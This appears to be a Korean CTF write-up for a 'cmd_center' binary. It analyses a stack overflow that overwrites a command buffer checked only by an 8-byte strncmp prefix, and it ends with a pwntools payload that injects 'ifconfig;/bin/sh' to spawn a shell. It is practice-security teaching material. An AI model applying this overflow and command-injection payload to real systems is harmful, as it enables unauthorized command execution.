#명령어주입 #스택버퍼오버플로우 

### 1. 파일 정보

ile cmd_center    
cmd_center: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=70ae6cc4fb300421b00f0b740114454d4560cc87, not stripped

```
[*]
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Canary를 제외한 모든 보호기법이 최대한으로 켜져 있다.
### 2. C 소스파일 분석

``` c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// 표준 입력(stdin)과 출력(stdout)의 버퍼링을 끔.
void init() {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

int main()
{
	/*
	cmd_ip : 256바이트 크기 문자열 버퍼. 기본값 "ifconfig"
	dummy : 그냥 더미 변수 (스택 정렬용)
	center_name : 24바이트 크기 버퍼
	*/
	char cmd_ip[256] = "ifconfig";
	int dummy;
	char center_name[24];

	init();

	/*
	read() 함수로 100바이트를 읽어서 center_name (24바이트)에 저장
	버퍼 오버플로우 발생 가능
	최대 24바이트까지만 안전, 나머지는 dummy 변수나 cmd_ip 영역을 덮어씀.
	*/
	printf("Center name: ");
	read(0, center_name, 100);

	/*
	strncmp(a, b, n)은 앞에서부터 최대 n바이트를 비교해서 같으면 0을 반환함.
	! 는 논리 부정 연산자이므로, 같을 때(0) -> 참(1)이 된다.
	즉, cmd_ip 가 앞 8바이트만 "ifconfig"와 같으면  조건을 통과하게 된다.
	"ifconfig"의 길이가 정확히 8이라서, 사실상 접두사(prefix)만 확인하는 셈이다.
	그래서 아래와 같은 값들도 전부 통과하게 된다
		"ifconfig -a", "ifconfig; /bin/sh", "ifconfig && id", "ifconfig | cat /flag"
	*/
	if( !strncmp(cmd_ip, "ifconfig", 8)) {
		system(cmd_ip);
	}

	else {
		printf("Something is wrong!\n");
	}
	exit(0);
}

```

cmd_ip 에는 256바이트가 할당되어 있고, "ifconfig\x00"문자열로 초기화되어 있다. center_name 에는 24바이트가 할당되어 있다.

read(0, center_name, 100) 으로 24바이트 공간보다 더 많은 입력을 받을 수 있는 환경이 주어져, 버퍼 오버플로우가 발생한다. 따라서 스택에 있는 다른 변수들 dummy, cmd_ip 등이나 스택 위의 주소를 덮을 가능성이 존재한다. 
디스어셈블하면서 정확히 어느 범위만큼 덮을 수 있는지 확인해 보자

strncmp(cmd_ip, "ifconfig", 8) 를 통해 기존 cmd_ip 에 저장되어 있는 "ifconfig"이 변조되지 않았는지 확인한다. 변조되지 않았을 경우에만 system(cmd_ip)를 실행한다.

### 3.  익스플로잇

#### 1) 익스플로잇
```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000000008ad <+0>: push   rbp
   0x00000000000008ae <+1>: mov    rbp,rsp
   0x00000000000008b1 <+4>: sub    rsp,0x130
   0x00000000000008b8 <+11>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000008c1 <+20>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000008c5 <+24>:    xor    eax,eax
   0x00000000000008c7 <+26>:    movabs rax,0x6769666e6f636669
   0x00000000000008d1 <+36>:    mov    edx,0x0
   0x00000000000008d6 <+41>:    mov    QWORD PTR [rbp-0x110],rax
   0x00000000000008dd <+48>:    mov    QWORD PTR [rbp-0x108],rdx
   0x00000000000008e4 <+55>:    lea    rdx,[rbp-0x100]
   0x00000000000008eb <+62>:    mov    eax,0x0
   0x00000000000008f0 <+67>:    mov    ecx,0x1e
   0x00000000000008f5 <+72>:    mov    rdi,rdx
   0x00000000000008f8 <+75>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000000008fb <+78>:    mov    eax,0x0
   0x0000000000000900 <+83>:    call   0x86a <init>
   0x0000000000000905 <+88>:    lea    rdi,[rip+0xf8]        # 0xa04
   0x000000000000090c <+95>:    mov    eax,0x0
   0x0000000000000911 <+100>:   call   0x710 <printf@plt>
   0x0000000000000916 <+105>:   lea    rax,[rbp-0x130]
   0x000000000000091d <+112>:   mov    edx,0x64
   0x0000000000000922 <+117>:   mov    rsi,rax
   0x0000000000000925 <+120>:   mov    edi,0x0
   0x000000000000092a <+125>:   call   0x720 <read@plt>
   0x000000000000092f <+130>:   lea    rax,[rbp-0x110]
   0x0000000000000936 <+137>:   mov    edx,0x8
   0x000000000000093b <+142>:   lea    rsi,[rip+0xd0]        # 0xa12
   0x0000000000000942 <+149>:   mov    rdi,rax
   0x0000000000000945 <+152>:   call   0x6e0 <strncmp@plt>
   0x000000000000094a <+157>:   test   eax,eax
   0x000000000000094c <+159>:   jne    0x95f <main+178>
   0x000000000000094e <+161>:   lea    rax,[rbp-0x110]
   0x0000000000000955 <+168>:   mov    rdi,rax
   0x0000000000000958 <+171>:   call   0x700 <system@plt>
   0x000000000000095d <+176>:   jmp    0x96b <main+190>
   0x000000000000095f <+178>:   lea    rdi,[rip+0xb5]        # 0xa1b
   0x0000000000000966 <+185>:   call   0x6f0 <puts@plt>
   0x000000000000096b <+190>:   mov    edi,0x0
   0x0000000000000970 <+195>:   call   0x740 <exit@plt>
End of assembler dump.
```

어셈블리를 확인해 보면 cmd_ip 는 [rbp-0x110] 의 위치에 있고, cmd_center 은 [rbp-0x130]의 위치에 있다.
따라서 cmd_center에 최대 100바이트를 입력 함으로써 생기는 버퍼 오버플로우는 cmd_ip 를 100 - 0x20 = 68바이트마큰 더 덮을 수 있다.
이는 main의 SFP 나 RET 를 조작할 만큼의 길지는 않기 때문에 com_ip를 어떤 식으로 변경하여야 원하는 명령을 실행 할 수 있을지 생각해 봐야 한다.

``` c
    if( !strncmp(cmd_ip, "ifconfig", 8)) {
        system(cmd_ip);
    }
```

strncmp(cmd_ip, "ifconfig", 8) 함수는 두 문자열을 비교하되, 정확히 8바이트 만큼만을 비교한다는 것이다. 따라서 제약 조건은 cmd_ip의 첫 8바이트만 "ifconfig"와 일치하면 된다는 것이다..

셸의 메타 캐릭터를 이용해서 더 많은 명령을 실행할 수 있다는 것을 알고 있으면 쉽게 해결할 수 있다.
```
ifconfig;/bin/sh
```

#### 2) 페이로드
``` python
from pwn import *

p = process("./cmd_center")

payload = b"A" * 0x20 + b"ifconfig" + b";/bin/sh"

p.send(payload)

p.interactive()

```